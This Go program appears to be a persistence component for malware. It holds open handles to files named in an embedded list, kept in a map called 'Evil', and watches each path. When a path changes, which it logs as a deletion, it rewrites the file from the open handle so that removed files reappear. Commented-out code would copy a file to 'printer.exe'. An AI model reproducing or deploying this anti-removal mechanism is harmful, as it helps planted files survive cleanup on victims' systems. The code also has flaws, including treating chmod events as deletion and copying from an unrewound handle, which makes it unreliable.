package main

import (
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"

	"strings"
	"time"

	"github.com/fsnotify/fsnotify"
)

var (
	//go:embed files/locations.txt
	locations string
)

var Evil = make(map[string]*os.File)

func OpenFiles() {
	lines := strings.Split(locations, "\n")
	i := 1
	for _, line := range lines {
		file, _ := os.Open(line)
		if file == nil {
			continue
		}
		fmt.Println(i, line)
		// fmt.Println(err)
		i++
		Evil[line] = file

		// dst, err := os.Create("printer.exe")
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		// defer dst.Close()

		// _, err = io.Copy(dst, file)
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		go DeletionObserver(line)

	}
}

func DeletionObserver(location string) {
	// Create a new watcher instance
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.Fatal(err)
	}
	defer watcher.Close()

	// Start listening for events.
	go func() {
		for {
			select {
			case event, ok := <-watcher.Events:
				if !ok {
					return
				}
				// log.Println("event:", event)
				if event.Has(fsnotify.Chmod) {
					log.Println("[DELETED]:", event.Name)
					log.Println("Replacing file!")
					Replace(location, Evil[location])
					watcher.Close()
					Evil[location].Close()
					return

				}
			case err, ok := <-watcher.Errors:
				if !ok {
					return
				}
				log.Println("error:", err)
			}
		}
	}()
	// Add a path.
	err = watcher.Add(location)
	if err != nil {
		log.Fatal(err)
	}

	// Block main goroutine forever.
	<-make(chan struct{})
}

func Replace(location string, file *os.File) {
	// Create a new file
	newFile, err := os.Create(location)
	if err != nil {
		panic(err)
	}
	defer newFile.Close()

	// Copy the contents of the original file to the new file
	_, err = io.Copy(newFile, file)
	if err != nil {
		panic(err)
	}
	fmt.Println("File Replaced", location)
	DeletionObserver(location)
}

func main() {
	fmt.Println(locations)
	OpenFiles()
	fmt.Println(Evil)
	for true {
		fmt.Println("[HEARTBEAT]", len(Evil))
		time.Sleep(time.Millisecond * 5000)
	}
}
